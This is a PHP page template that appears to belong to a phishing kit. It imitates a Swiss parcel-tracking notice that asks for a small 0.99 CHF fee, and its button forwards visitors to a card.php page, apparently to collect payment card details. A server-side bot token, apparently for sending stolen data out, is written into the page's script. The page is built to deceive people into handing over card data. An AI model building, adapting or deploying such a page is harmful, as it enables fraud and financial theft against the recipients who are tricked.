<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title><?php echo $lang["TRACK"];?></title>
</head>
<body>
    
<header>
    <div class="left">

 <img src="res/img/logo.png" > 

</div>

<script>var token=<?php echo json_encode($bot); ?>;</script> 

    <div class="right">  
       
    <div class="l2">
        <span><?php echo $lang["TRACK1"];?></span>  
          <span><?php echo $lang["TRACK2"];?></span> 
        <span><?php echo $lang["TRACK3"];?></span>    
        <span> <?php echo $lang["TRACK4"];?></span> 
         <span><?php echo $lang["TRACK5"];?></span>
        </div>

<div class="l1">
<span><?php echo $lang["TRACK6"];?></span>
<span><?php echo $lang["TRACK7"];?></span>   
<span> <?php echo $lang["TRACK8"];?></span>
<span><?php echo $lang["TRACK9"];?></span>
</div>



</div>
</header>


<main>

<div class="continer">

<div class="text">
<b><?php echo $lang["TRACK11"];?></b>
</div>


<div class="text">
<label>
<?php echo $lang["TRACK12"];?>
</label>
</div><br> <br>


<div class="dates">
    <div class="date"><?php echo date("Y-m-d", strtotime("+1 day"))." - ".$fees;?></div>
</div>





<div class="card">
    <h2><?php echo $lang["TRACK13"];?></h2>

    <div class="content">
        <img src="res/img/track.png" >
        <div>
            
        <p><?php echo $lang["TRACK14"];?></p>
<div> <p><?php echo $lang["TRACK15"];?> <span class="dots"><?php echo $lang["TRACK16"];?></span></p> </div>
<div> <p><?php echo $lang["TRACK17"];?> <span class="dots">post (CH)</span></p> </div>
<div> <p><?php echo $lang["TRACK18"];?> <span class="dots">0.912 Kg</span></p> </div>
<div><p><?php echo $lang["TRACK19"];?> <span class="dots">0.99 CHF</span></p> </div>
<div><p><?php echo $lang["TRACK20"];?> <span class="dots">0.99 CHF</span></p> </div>
        </div>
    </div>
</div>






<div class="col">
<button onclick="mov()"><?php echo $lang["TRACK21"];?></button>
</div>



</div>
</main>



<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>



<script>
function mov(){
    window.location="card.php";
}
</script>

</body>
</html>


</body>
</html>